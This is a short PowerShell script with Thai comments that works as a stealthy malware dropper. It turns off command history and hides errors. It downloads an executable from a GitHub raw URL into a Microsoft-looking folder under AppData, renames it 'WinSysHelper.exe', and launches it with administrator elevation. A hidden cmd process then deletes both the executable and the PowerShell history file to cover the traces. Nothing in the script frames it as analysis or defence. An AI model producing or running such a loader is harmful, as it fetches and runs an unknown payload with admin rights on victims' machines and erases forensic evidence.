# 1. ปิดการทิ้งประวัติก่อน
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'

# 2. ตั้งที่อยู่ใหม่ (เนียนๆ ใน AppData)
$dir = "$env:APPDATA\Microsoft\WindowsNT"
if (-not (Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force }
$output = "$dir\WinSysHelper.exe"
$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"

# 3. ล้างไฟล์เก่าและดาวน์โหลดใหม่
if (Test-Path $output) { Remove-Item $output -Force }
try {
    (New-Object System.Net.WebClient).DownloadFile($url, $output)
} catch {
    Invoke-WebRequest -Uri $url -OutFile $output
}

# 4. เช็คไฟล์แล้วรัน Admin
if (Test-Path $output) {
    Start-Process -FilePath $output -Verb RunAs
    Start-Sleep -Seconds 2
}

# 5. เปิดการทิ้งประวัติกลับมา
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}

# 6. ใช้ CMD เก็บกวาด (ลบไฟล์ EXE และลบ History)
$historyPath = (Get-PSReadlineOption).HistorySavePath
$cleanCmd = "timeout /t 10 && del /f /q `"$output`" && del /f /q `"$historyPath`""
Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden

exit
